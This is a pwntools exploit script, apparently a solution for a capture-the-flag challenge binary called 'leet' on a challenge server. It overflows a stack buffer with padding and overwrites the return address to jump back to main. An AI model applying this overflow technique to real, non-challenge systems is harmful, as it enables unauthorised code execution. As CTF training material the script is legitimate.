#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
HOST = "0.cloud.chals.io"
PORT = 26008

CHALL_BIN = "./leet"
gs = '''
b main
b *0x8049501
c
'''
elf = context.binary

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return gdb.debug([elf.path], gdbscript=gs)

def exploit():
    padding1 = b'a'*0x18 + b'p'*0x20
    io.sendline(padding1 + p32(elf.symbols["main"]))

io = start()
exploit()
io.interactive()